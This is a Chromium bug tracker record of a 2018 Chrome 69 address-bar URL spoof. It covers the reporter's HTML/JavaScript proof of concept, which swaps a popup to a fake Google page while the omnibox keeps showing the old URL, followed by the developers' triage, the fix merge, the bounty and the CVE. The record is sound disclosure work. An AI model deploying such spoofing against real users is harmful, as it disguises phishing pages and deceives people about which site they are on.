# Chrome 69 URL Spoof via double-click

| Field | Value |
|-------|-------|
| **Issue ID** | [40092363](https://issues.chromium.org/issues/40092363) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Navigation, UI>Browser>Omnibox |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2018-09-05 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36

Steps to reproduce the problem:
1. step1: click button
2. step2: double click url address bar
3. step3: done

What is the expected behavior?
n/a

What went wrong?
PoC: https://server.n0tr00t.com/chrome/v69_urlspoof.html

```
    <html>
    <head>
        <title>Chrome 69 Double-click URL Spoof - evi1m0.bat[at]gmail.com</title>
    </head>
    <body>
        <li>step1: click button</li>
        <li>step2: double click the address bar of the new window</li>
        <br>
        <button onclick="pwn()">clickme</button>

        <script>
            var pwn = () => {
                win = window.open("https://google.com", "test", "width=400 height=400");
                setTimeout("win.location = './fake_google.html'", 4000);
            }
        </script>
    </body>
    </html>
```

Did this work before? N/A 

Chrome version: 69.0.3497.81  Channel: stable
OS Version: OS X 10.13.5
Flash Version: 

I think when the page refreshes, URL should be like the result of clicking once, and the address bar will be rendered again.

## Attachments

- [5ad5784-43e8-414a-adc2-a80ac0334e44.png](attachments/5ad5784-43e8-414a-adc2-a80ac0334e44.png) (image/png, 126.5 KB)
- [20180905_200305.gif](attachments/20180905_200305.gif) (image/gif, 465.1 KB)

## Timeline

### mp...@google.com (2018-09-05)

Can somebody confirm this on Mac (doesn't reproduce on ChromeOS or Linux) and suggest an owner?

[Monorail components: UI>Browser>Navigation UI>Browser>Omnibox]

### ev...@gmail.com (2018-09-05)

[Empty comment from Monorail migration]

### kr...@chromium.org (2018-09-05)

Duplicated in 69 on Mac. Canary (71.0.3543) works fine. (Shows correct URL.)

### sh...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### na...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-09-05)

jdonnelly@: This appears to be a regression from the new omnibox refresh in M69, probably related to how the text changes when you click in the omnibox.  If you double click on the omnibox and *then* the page in the tab navigates while the text is selected, we're not resetting the omnibox text to the new URL the way we did in Chrome 68 and before.

Contrary to comments 1 and 3, I can repro this bug on all Chrome 69+ versions/platforms: Windows/Mac/Linux Stable 69.0.3497.81, Mac Canary 71.0.3543.0.

I agree with Medium severity, since it's a URL spoof that has mitigating factors (it depends on the user double clicking at the wrong time).

I expect there's some reset that used to happen in the omnibox logic and doesn't happen anymore.  It is possible to hit Escape to see the new URL, but that didn't used to be necessary, and we should fix that.  Any ideas where to look in the new code?  Thanks!

### cr...@chromium.org (2018-09-05)

Hmm, that's weird-- I could have sworn I saw it on Mac Canary 71.0.3543.0, but now I can't repro it there (or on Windows Canary).  Maybe this is fixed after all.  I'll try to bisect to see what I come up with.

### cr...@chromium.org (2018-09-05)

Ah!  I was having trouble bisecting because the bug only occurs when the OmniboxUIExperimentHideSteadyStateUrlSchemeAndSubdomains feature is enabled.  That's enabled by default in Finch, but it doesn't apply to the first run, which is what I was seeing when bisecting (thus I never observed the bug there).

I'm trying again after manually enabling that feature during bisect.  tommycli@, I'm guessing you're familiar with it based on r526096.

### cr...@chromium.org (2018-09-05)

Indeed!  This was fixed by tommycli@ in r584056 for https://crbug.com/chromium/875002.  Sadly, that landed in 70.0.3526.0 and was not merged to M69.

tommycli@: Would this be a safe merge to M69?

awhalley@: Do you think we should merge it to M69 given the Medium severity?  There's a mitigating factor that the user has to select text in the omnibox to unelide it, but after that the attacker can load any URL they want underneath it without updating the omnibox.

### aw...@google.com (2018-09-05)

It's been in dev for a good couple of weeks, and the fix is nice and straight forward; I'd support a 69 merge. 

### to...@chromium.org (2018-09-06)

I support a merge to 69. Merge request for the below patch:

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/02035ae5926720d49bcd4a1bae42df4ffd6ac158

commit 02035ae5926720d49bcd4a1bae42df4ffd6ac158
Author: Tommy C. Li <tommycli@chromium.org>
Date: Fri Aug 17 14:14:52 2018

Omnibox: Steady State Elisions - Reset URL unless user has edited it

Currently, if the user has unelided the URL, the URL won't reset on
navigation.

Instead, we should only only preserve the URL if the user has actually
made modifications, rather than merely uneliding the URL.

Bug:  875002 
Change-Id: Ie138ee9a0b4cf7d7d903d600a739deb2378de29c
Reviewed-on: https://chromium-review.googlesource.com/1178631
Reviewed-by: Justin Donnelly <jdonnelly@chromium.org>
Commit-Queue: Tommy Li <tommycli@chromium.org>
Cr-Commit-Position: refs/heads/master@{#584056}
[modify] https://crrev.com/02035ae5926720d49bcd4a1bae42df4ffd6ac158/components/omnibox/browser/omnibox_edit_model.cc



### sh...@chromium.org (2018-09-06)

This bug requires manual review: Request affecting a post-stable build
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), kariahda@(iOS), cindyb@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-09-06)

[Empty comment from Monorail migration]

### go...@chromium.org (2018-09-06)

Approving merge to M69 branch 3497 based on comments #10,#11 and #12. Please merge ASAP.

### to...@chromium.org (2018-09-06)

Merge to 69 has been submitted: https://chromium-review.googlesource.com/c/chromium/src/+/1210542

Thanks.

### to...@chromium.org (2018-09-06)

[Empty comment from Monorail migration]

### to...@chromium.org (2018-09-06)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-09-06)

Thanks all!

### go...@chromium.org (2018-09-07)

tommycli@ to verify on M69 on Monday, 09/10.

### cr...@chromium.org (2018-09-07)

I've verified that this bug is fixed in the staging build of 69.0.3497.87 on Mac, using --enable-features=OmniboxUIExperimentHideSteadyStateUrlSchemeAndSubdomains.  (As noted in https://crbug.com/chromium/880759#c9, that feature is required to see the original bug, and it's enabled by default but not present on the first run in a profile.)

### to...@chromium.org (2018-09-10)

Thanks. creis verified in c#21.

### aw...@chromium.org (2018-09-11)

[Empty comment from Monorail migration]

### aw...@google.com (2018-09-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-09-12)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-09-12)

Nice one evi1m0.bat@! The VRP panel decided to award $1,000 for this report - thanks!

### aw...@google.com (2018-09-12)

[Empty comment from Monorail migration]

### ev...@gmail.com (2018-09-13)

Thank for reward :)

### aw...@chromium.org (2018-09-25)

Pardon the delay. A CVE has has been allocated for this bug, and https://chromereleases.googleblog.com/2018/09/stable-channel-update-for-desktop_11.html updated accordingly. Cheers!

### aw...@chromium.org (2018-09-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-13)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/880759?no_tracker_redirect=1

[Multiple monorail components: UI>Browser>Navigation, UI>Browser>Omnibox]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092363)*
